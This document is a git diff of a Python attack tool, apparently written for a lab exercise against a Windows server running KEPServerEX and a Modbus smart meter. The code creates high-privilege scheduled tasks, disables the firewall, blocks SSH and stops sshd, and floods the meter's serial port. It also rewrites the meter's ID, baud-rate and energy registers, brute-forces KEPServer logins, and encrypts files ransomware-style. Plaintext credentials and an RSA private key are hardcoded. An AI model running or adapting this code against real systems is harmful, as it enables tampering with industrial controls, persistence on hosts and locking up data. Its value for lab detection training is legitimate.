@@ -34,12 +34,14 @@ COPIED_PATH = "C:\\Windows\\temp\\Smartmeter"
 # Set the path for the Smart Meter folder
 SMARTMETER_PATH = "C:\\Users\\Student\\Documents\\AttackFolder"
 
-# Default credentials for windows server
+# Default credentials for windows server. 
+# TODO: To check if the GUI can replace these variables
 USERNAME = "Student"
 PASSWORD = "Student12345@"
 WINDOWS_SERVER_IP = "172.16.2.223"
 
 # Path for the Modpoll
+# TODO: Either a modpoll path finder or make a modpoll unpacker
 MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
 
 
@@ -59,7 +61,22 @@ MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
 #     if not isAdmin:
 #         ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)
 
-def ssh_run_commands(command, host=WINDOWS_SERVER_IP, username=USERNAME, password=PASSWORD):
+def ssh_run_command(command: str, host: str=WINDOWS_SERVER_IP, username: str=USERNAME, password: str=PASSWORD) -> str:
+    """
+    Runs a SINGLE command through ssh remotely and grab the output.
+    
+    Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file
+
+    Args:
+        command: Command to run.
+        host: IP Address of the remote device.
+        username: Username of the remote device.
+        password: Password of the remote device.
+    
+    Returns:
+        The output of the command ran
+
+    """
     ssh_output: str = "" # Declare as string to prevent error proning
     
     if password is None:
@@ -77,9 +94,8 @@ def ssh_run_commands(command, host=WINDOWS_SERVER_IP, username=USERNAME, passwor
 
     return ssh_output
 
-
-
 # Delete files in a specific folder
+# TODO: Document this code, or remove it.
 def delete_files(folder_path):
     for root, dirs, files in walk(folder_path):
         for file in files:
@@ -90,10 +106,11 @@ def delete_files(folder_path):
 
 def create_scheduled_task() -> None:
     """
-    Creates scheduled task in windows to execute the attackscript from time to time.
+    Creates scheduled task in windows to execute the AttackScript.exe every minute.
 
     # TODO: Add comments on how frequent the schtasks run.
-    # FIXME: Might be decpricated once this is done with powershell, as the AttackScript.exe is uselsss
+    # FIXME: Might be decpricated once this is done with powershell, as the AttackScript.exe is useless.
+    # TODO: Self pyinstaller itself and then unpack the exe remotely and run itself with task scheduler.
     """
     try:
         executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe'
@@ -106,12 +123,10 @@ def create_scheduled_task() -> None:
         sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
         sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
 
-        # call(sch1, shell=True)
-        # call(sch2, shell=True)
-
-        # TODO: wait for the PS Command and see if this works.
-        stuff = run(f"powershell.exe New-PSSession -ComputerName {WINDOWS_SERVER_IP} -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList Student, (ConvertTo-SecureString Student12345@ -AsPlainText -Force)) {sch1}", stdout=PIPE, shell=True)
-        print(stuff)
+        # TODO: Test if the task scheduler works.
+        command_output_1 = ssh_run_command(sch1)
+        command_output_2 = ssh_run_command(sch2)
+        print(command_output_1); print(command_output_2)
         print("\nOk.\n")
     except Exception as e:
         print(e)
@@ -163,41 +178,45 @@ def copy_file(folder_path):
 #     except Exception as e:
 #         print("\nFail.\n")
 
-# Disable the firewall
-def disable_firewall():
+def disable_firewall() -> None:
+    """
+    Turn off all three domains of the firewall
+    """
     #cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
-    command_output = ssh_run_commands("netsh advfirewall set allprofiles state off")
+    command_output = ssh_run_command("netsh advfirewall set allprofiles state off")
 
     if "Ok." in command_output:
         print("Firewall disabled successfully\nOk.\n")
     else:
         print("Firewall failed to disable\nFail.\n")
 
-# Disable SSH from the firewall
-def disable_ssh():
+def disable_ssh() -> None:
+    """
+    Disable SSH from the firewall
+    """
     count = 0
-    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22')
+    command_output = ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22')
     if "Ok." in command_output:
         count += 1
         print("Inbound Firewall Successfully Inserted (Blocked: TCP/22)")
     else:
         print("Inbound Firewall Failed to be Inserted")
 
-    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22')
+    command_output = ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22')
     if "Ok." in command_output:
         count += 1
         print("Inbound Firewall Successfully Inserted (Blocked: UDP/22)")
     else:
         print("Inbound Firewall Failed to be Inserted")
 
-    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22')
+    command_output = ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22')
     if "Ok." in command_output:
         count += 1
         print("Outbound Firewall Successfully Inserted (Blocked: TCP/22)")
     else:
         print("Outbound Firewall Failed to be Inserted")
         
-    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22')
+    command_output = ssh_run_command('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22')
     if "Ok." in command_output:
         count += 1
         print("Outbound Firewall Successfully Inserted (Blocked: UDP/22)")
@@ -205,7 +224,7 @@ def disable_ssh():
         print("Outbound Firewall Failed to be Inserted")
 
     service_name = "sshd"
-    command_output = ssh_run_commands(f"sc stop {service_name}")
+    command_output = ssh_run_command(f"sc stop {service_name}")
 
     if "FAILED" in command_output:
         print(f"FAILED: {command_output}")
@@ -218,31 +237,35 @@ def disable_ssh():
     else:
         print("SSH Failed to Disable.\nFail.\n")
 
-#Run modpoll to interrupt COM1 port
-def run_modinterrupt():
+def run_modinterrupt() -> None:
+    """
+    Run modpoll to interrupt COM1 port by disabling KEP Server and then run modpoll indefenitely
+    """
     kep_server_stop()
+
+    baudrate = baudrate_check()
 
     executable_path = MODPOLL_PATH + r"\modpoll.exe"
 
-    parameters = ["-1", "-b", '9600', '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1']
+    parameters = ["-1", "-b", baudrate, '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1']
     
-    check_modpoll = ssh_run_commands(f"{executable_path} {' '.join(parameters)}")
+    check_modpoll = ssh_run_command(f"{executable_path} {' '.join(parameters)}")
 
-    # FIXME: Get the baudrate to run with this.
     if "Polling" in check_modpoll:
         print("Modinterrupt is running \nOk.\n")
-        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
+        parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
         try:
-            ssh_run_commands(f"{executable_path} {' '.join(parameters)}")
+            ssh_run_command(f"{executable_path} {' '.join(parameters)}")
         except CalledProcessError as e:
             print("Error executing the executable file:", e)
     else:
         print("Modinterrupt is not running. \n Fail.\n")
 
-
-#Disable a COM port
-def disable_COMPort():
-
+def disable_COMPort() -> None:
+    """
+    Disable a COM port
+    # TODO: Change to ssh_run_command()
+    """
     netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
     if "RUNNING" in netshare.stdout:
         print("Kepserver is running, Stopping now.")
@@ -286,7 +309,7 @@ def disable_COMPort():
 
     remove("script.bat")
 
-def encrypt_files():
+def encrypt_files() -> None:
     #public key
     pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxTm9UT1pTRkI5SjEwVWF3bUNGRgpTWERLeE1tUFRQTDFKQmVyQ2xGbkI0MDJNblBtSVc1WXp6SXo4S29Rc2JzTXhQK3B4SSt4TzJmM283dW1RU0YwCitKdnRFNlRLc2RXN3JCTzJFNzVFekZzUXR0QmdyZEthOXJOL2ZVV3dwUXNFdFBwL1Jnay9XNENRcWZzUFZLQXAKTnFQWE43SllHNjJ0L1Y1Wk8zSTFRYmpHSUJ4UFF1U2ZrODhIa3l5NkdYWE1UOHRaT2pHUHNMUy9wTVkwaVEvUwp6RUh2M2RRYzJXZ2dJY3FBbUFKT0VWS2pyTFBHYlUvdHIzNWw4MDVIbHdoa3RmUXVsQStBR3JLT2JYdDdPK1cvCkxPU21Ib2VnSXJOaHZtRGsvUFRtRGFtYzdhTUIwaTZhZGIrRzFEMU5Sc0RXZEwyS3Rkb0lnMGVGQk9oQ0JtQUQKbndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
     pubKey = base64.b64decode(pubKey)
@@ -309,9 +332,15 @@ def encrypt_files():
 
 def encrypt(dataFile, publicKey):
     '''
-    Input: path to file to encrypt, public key
-    Output: encrypted file with extension .L0v3sh3 and remove original file
-    use EAX mode to allow detection of unauthorized modifications
+    <Insert description here>
+    NOTE: use EAX mode to allow detection of unauthorized modifications
+
+    Args:
+        dataFile: path to file to encrypt
+        publicKey: The public key
+
+    Returns:
+        Encrypted file with extension .L0v3sh3 and remove original file
     '''
     # read data from file
     extension = dataFile.suffix.lower()
@@ -352,9 +381,9 @@ def recurseFiles(baseDirectory):
             yield from recurseFiles(entry.path)
 
 def decrypt(dataFile, privatekey):
-    '''
-    use EAX mode to allow detection of unauthorized modifications
-    '''
+    """
+    NOTE: use EAX mode to allow detection of unauthorized modifications
+    """
 
     key = RSA.import_key(privatekey)
 
@@ -382,8 +411,10 @@ def decrypt(dataFile, privatekey):
         print("File have not been encrypted.")
 
 #Run modpoll to change register 40201 to 26
-def change_meterID():
-
+def change_meterID() -> None:
+    """
+    Run modpoll to change register 40201 (Which handle the meter ID) to 26
+    """
     kep_server_stop()
     
     executable_path = MODPOLL_PATH + r"\modpoll.exe"
@@ -391,14 +422,18 @@ def change_meterID():
     parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "201", "COM1", "26"]
 
     # FIXME: Try except for running the executable is gone
-    print(ssh_run_commands(f"{executable_path} {' '.join(parameters)}"))
+    print(ssh_run_command(f"{executable_path} {' '.join(parameters)}"))
     kep_server_start()
 
     print("\nOk.\n")
 
 
-def clear_energy_reading():
-
+def clear_energy_reading() -> None:
+    """
+    TL:DR Run modpoll to clear energy reading.
+    
+    In full, Register 40253 clears the energy reading when writing the value "78" to it. This clears the energy reading found in address 40026
+    """
     kep_server_stop()
 
     executable_path = MODPOLL_PATH + r"\modpoll.exe"
@@ -406,9 +441,9 @@ def clear_energy_reading():
     clear_energy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "253", "COM1", "78"]
     
     # FIXME: Try except for running the executable is gone
-    print(ssh_run_commands(f"{executable_path} {' '.join(check_energy)}"))
-    print(ssh_run_commands(f"{executable_path} {' '.join(clear_energy)}"))
-    print(ssh_run_commands(f"{executable_path} {' '.join(check_energy)}"))
+    print(ssh_run_command(f"{executable_path} {' '.join(check_energy)}"))
+    print(ssh_run_command(f"{executable_path} {' '.join(clear_energy)}"))
+    print(ssh_run_command(f"{executable_path} {' '.join(check_energy)}"))
 
     print("Energy Reading Cleared.")
 
@@ -416,7 +451,10 @@ def clear_energy_reading():
 
     print("\nOk.\n")
 
-def kep_bruteforce():
+def kep_bruteforce() -> None:
+    """
+    Bruteforces the usernames and passwords of the KEP Server.
+    """
 
     kep_server_start()
 
@@ -428,7 +466,7 @@ def kep_bruteforce():
         for password in passwords:
             print("Trying Username: " + username +", Trying Password: " + password)
             # Read and print each line in the file
-            # BUG: Why open KEPServerProperties?
+            # BUG: Why open KEPServerProperties? And also need to keep the kepserverproperties log somewhere, not in the local server.
             try:
                 server = kepconfig.connection.server(host = WINDOWS_SERVER_IP, port = 57412, user = username, pw = password)
                 output = server.get_project_properties()
@@ -444,8 +482,10 @@ def kep_bruteforce():
     if success == 0:
         print("\nFail.")
 
-#Run modpoll to change baud rate - Register 40206 
-def baudrate_change():
+def baudrate_change() -> None:
+    """
+    Run modpoll to change baud rate - Register 40206
+    """
     kep_server_stop()
 
     executable_path = MODPOLL_PATH + r"\modpoll.exe"
@@ -474,23 +514,25 @@ def baudrate_change():
 
     parameters = ["-b", current_baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "COM1", new_baudrate]
     
-    ssh_run_commands(f"{executable_path} {' '.join(parameters)}")
+    ssh_run_command(f"{executable_path} {' '.join(parameters)}")
     kep_server_start()
 
-def baudrate_check():
+def baudrate_check() -> str:
+    """
+    Run modpoll to check the baudrate - Register 40206
+    """
     kep_server_stop()
 
     executable_path = MODPOLL_PATH + r"\modpoll.exe"
 
-    found_baudrate = 0
+    found_baudrate: int = 0
     baudrate_list = ["4800", "9600", "19200"]
 
     for baudrate in baudrate_list:
         parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "-1", "COM1"]
-        baudrate_output = ssh_run_commands(f"{executable_path} {' '.join(parameters)}")
+        baudrate_output = ssh_run_command(f"{executable_path} {' '.join(parameters)}")
 
         print(f"Checking baudrate {baudrate}:")
-        # print(baudRateOutput)
        
         if "[206]:" in baudrate_output:
             print(f"Baudrate is {baudrate}\n")
@@ -498,24 +540,14 @@ def baudrate_check():
             break
         else:
             print(f"Baudrate is not {baudrate}\n")
-        
-    kep_server_start()
+
+    # NOTE: The kep_server_start() is removed as commands using this function will try to stop KEPServer anyways
     print("\nOk.\n")
 
     return found_baudrate
 
 def smartmeter_get_hardware_info():
-    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-    if "RUNNING" in netshare.stdout:
-        print("Kepserver is running, Stopping now.")
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "stop", service_name], stdout=PIPE, check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-            sleep(15)
+    kep_server_stop()
 
     current_directory = getcwd()
     executable_path = current_directory + "\\modpoll.exe"
@@ -542,56 +574,30 @@ def smartmeter_get_hardware_info():
             print(f"Hardware version: {hardwareOutput[hardware_index + 1]}")
         else:
             print(f"Hardware version cannot be detected")
-        
-        try: 
-            service_name = "KEPServerEXV6"
-            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
-            output = cp.stdout.decode('utf-8').strip().split()
-            if "FAILED" in cp.stdout.decode('utf-8'):
-                print("FAILED: " + " ".join(output[4:]))
-                print("Fail.\n")
-            else:
-                print("The " + output[1] + " service is " + output[9])
 
-            print("\nOk.\n")
-        except CalledProcessError as e:
-            print("Error executing the executable file:", e)
-            print("Fail.\n")
+        # TODO: Add try except 
+        kep_server_start()
     
     else:
-        try: 
-            service_name = "KEPServerEXV6"
-            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
-            output = cp.stdout.decode('utf-8').strip().split()
-            if "FAILED" in cp.stdout.decode('utf-8'):
-                print("FAILED: " + " ".join(output[4:]))
-                print("Fail.\n")
-            else:
-                print("The " + output[1] + " service is " + output[9])
-
-            print("\nOk.\n")
-        except CalledProcessError as e:
-            print("Error executing the executable file:", e)
-            print("Fail.\n")
-
+        # TODO: Add try except 
+        kep_server_start()
         raise Exception("Unable to connect to the SmartMeter")
 
-   
     return
         
 
 
 # TODO: REVERT THIS THING PAIN.
-def revert(revertoption):
+def revert(revert_option):
     # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
-    if revertoption == "1":
+    if revert_option == "1":
         cp = run('netsh advfirewall set allprofiles state on',stdout=PIPE , shell=True)
         if cp.stdout.decode('utf-8').strip() == "Ok.":
             print("Firewall enabled successfully.\nOk.\n")
         else:
             print("Firewall failed to enable.\nFail.\n")
         
-    elif revertoption == "2":
+    elif revert_option == "2":
         count = 0
         cp = run('netsh advfirewall firewall delete rule name="QRadar Test"', stdout=PIPE)
         if "Ok." in cp.stdout.decode('utf-8'):
@@ -632,7 +638,7 @@ def revert(revertoption):
         else:
             print("Revert Fail.\nFail.\n")
         
-    elif revertoption == "3":
+    elif revert_option == "3":
 
         process_name = "modpoll"
         pid = 0
@@ -655,7 +661,7 @@ def revert(revertoption):
         else:
             print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
         
-    elif revertoption == "4":
+    elif revert_option == "4":
         cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
         dump = cp.stdout.split()
         deviceID = ""
@@ -675,7 +681,7 @@ def revert(revertoption):
             print("Device not enabled. \nFail.\n")
         remove("script.bat")
 
-    elif revertoption == "5":
+    elif revert_option == "5":
         privatekey = '''-----BEGIN RSA PRIVATE KEY-----
 MIIEpQIBAAKCAQEAqNoTOZSFB9J10UawmCFFSXDKxMmPTPL1JBerClFnB402MnPm
 IW5YzzIz8KoQsbsMxP+pxI+xO2f3o7umQSF0+JvtE6TKsdW7rBO2E75EzFsQttBg
@@ -719,7 +725,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         except Exception as e:
             print("Decryption Failed.\nFail.\n")
 
-    elif revertoption == "6":
+    elif revert_option == "6":
 
         netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
         if "RUNNING" in netshare.stdout:
@@ -750,7 +756,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         else:
             print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
 
-    elif revertoption == "7":
+    elif revert_option == "7":
         process_name = "modpoll"
         pid = 0
 
@@ -764,7 +770,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
             kill(pid, signal.SIGTERM)
             print("Modpoll pid:", pid, "has stopped. \nOk.\n")
 
-    elif revertoption == "8":
+    elif revert_option == "8":
         
         for root, dirs, files in walk(COPIED_PATH):
             for file in files:
@@ -797,7 +803,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
 
         print("Ok.")
 
-    elif revertoption == "9":
+    elif revert_option == "9":
 
         # Stop Modpoll.exe
         print("\n==================================\n")
@@ -1003,15 +1009,28 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
 
         print("Reverting successfull.\nOk.\n")
 
-    elif revertoption == "-h":
+    elif revert_option == "-h":
         print("\n Choose: \n1 Enable firewall, \n2 Re-enable ssh through firewall, \n3 Re-enable kepserver service, \n4 Re-enable COM port, \n5 Decrypt encrypted files, \n6 Change meter25 id back, \n7 Kill Modpoll, \n8 Remove shared folder and Scheduled Task,\n9 Revert Everything.")
     else:
         print ("Invalid Option! Use option \"-h\" for help!")
 
-def kep_connect():
+def kep_connect(host: str=WINDOWS_SERVER_IP, port: int=57412) -> connection.server:
+    """
+    Connects to the KEPServer.
+
+    NOTE: 172.16.2.77 if at lv 7\n
+    NOTE: 172.16.2.223 if at lv 6
+
+    Args:
+        host: IP Address of the Remote KEPServer
+        port: Port of the Remote KEPServer
+
+    Returns:
+        returns an instance of kepconfig.connection.server
+    """
     # 172.16.2.77 if at lv 7
     # 172.16.2.223 if at lv 6
-    server = connection.server(host = '172.16.2.77', port = 57412, user = 'Administrator', pw = 'administrator2022')
+    server = connection.server(host = host, port = 57412, user = 'Administrator', pw = 'administrator2022')
     print("Connected to KEP server.")
     return server
 
@@ -1057,26 +1076,33 @@ def kep_delete_spoofed_device():
     print("DELETE DEVICE: " + json.dumps(connectivity.device.del_device(server, "SmartMeter.Device69"), indent=4))
 
 def disable_running_schedules() -> None:
-    cp = run(["schtasks", "/change", "/TN", "\MoveFiles", "/disable"], stdout=PIPE, check=False)
-    output = cp.stdout.decode('utf-8').strip().split()
-    if "SUCCESS:" in output:
-        print("Successfully disabled \MoveFiles Tasks Scheduler", file=sys.stdout)
+    """
+    Disables MoveFiles and KEPServerEX 6.12 running schedules in task scheduler
+    """
+    command_output = ssh_run_command("schtasks /change /TN \MoveFiles /disable")
+    if "SUCCESS:" in command_output:
+        print("Successfully disabled \MoveFiles Tasks Scheduler")
         print("Ok.")
 
-    cp = run(["schtasks", "/change", "/TN", "\KEPServerEX 6.12", "/disable"], stdout=PIPE, check=False)
-    output = cp.stdout.decode('utf-8').strip().split()
-    if "SUCCESS:" in output:
-        print("Successfully disabled \KEPServerEX 6.12 Tasks Scheduler", file=sys.stdout)
+    command_output = ssh_run_command("schtasks /change /TN \KEPServerEX 6.12 /disable")
+    if "SUCCESS:" in command_output:
+        print("Successfully disabled \KEPServerEX 6.12 Tasks Scheduler")
         print("Ok.")
     
-def kep_server_stop():
-    command_output = ssh_run_commands("sc query KEPServerEXV6")
+def kep_server_stop() -> bool:
+    """
+    Stops KEPServer service
+
+    Returns:
+        A boolean based off if the command stop service could execute or not.
+    """
+    command_output = ssh_run_command("sc query KEPServerEXV6")
     if "RUNNING" in command_output:
         print("Kepserver is running, Stopping now...")
-        command_output = ssh_run_commands("sc stop KEPServerEXV6")
+        command_output = ssh_run_command("sc stop KEPServerEXV6")
         
         while "STOP_PENDING" in command_output:
-            command_output = ssh_run_commands("sc query KEPServerEXV6")
+            command_output = ssh_run_command("sc query KEPServerEXV6")
             if "FAILED" in command_output:
                 print("FAILED:", "\nFail.\n") 
                 return False
@@ -1086,6 +1112,7 @@ def kep_server_stop():
             else:
                 print("Kepserver is still stopping... waiting 1 more second")
                 sleep(1)
+    
     elif "STOPPED" in command_output:
         print("Kepserver have already stopped")
         return True
@@ -1094,13 +1121,19 @@ def kep_server_stop():
         return False
 
 def kep_server_start():
-    command_output = ssh_run_commands("sc query KEPServerEXV6")
+    """
+    Starts KEPServer service
+
+    Returns:
+        A boolean based off if the command start service could execute or not.
+    """
+    command_output = ssh_run_command("sc query KEPServerEXV6")
     if "STOPPED" in command_output:
         print("Kepserver is stopped, starting now...")
-        command_output = ssh_run_commands("sc start KEPServerEXV6")
+        command_output = ssh_run_command("sc start KEPServerEXV6")
 
         while "START_PENDING" in command_output:
-            command_output = ssh_run_commands("sc query KEPServerEXV6")
+            command_output = ssh_run_command("sc query KEPServerEXV6")
             if "FAILED" in command_output:
                 print("FAILED:", "\nFail.\n")
                 return False
@@ -1110,6 +1143,7 @@ def kep_server_start():
             else:
                 print("Kepserver is still starting up... waiting 1 more second")
                 sleep(1)
+            
     elif "RUNNING" in command_output:
         print("Kepserver is running!")
         return True
@@ -1117,23 +1151,18 @@ def kep_server_start():
         print("Something went wrong!")
         return False
 
-# TODO: kep_server_start()
-
 ########
 # MAIN #
 ########
-
-if __name__ == '__main__':
+def main():
     attack_option = str(argv[1])
     
     # if attack_option != "1":
     #     check_admin()
 
     match attack_option:
-        case "start": kep_server_start()
-        case "stop":  kep_server_stop()
         case "1":  create_scheduled_task() 
-        #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH)
+        #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH) # TODO: Determine if this function is depricated
         case "3":  disable_firewall()
         case "4":  disable_ssh()
         case "5":  kep_server_stop()
@@ -1160,3 +1189,6 @@ if __name__ == '__main__':
         case "-h":
             print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
         case _: print("Invalid Option! Use option \"-h\" for help!")
+
+if __name__ == '__main__':
+    main()
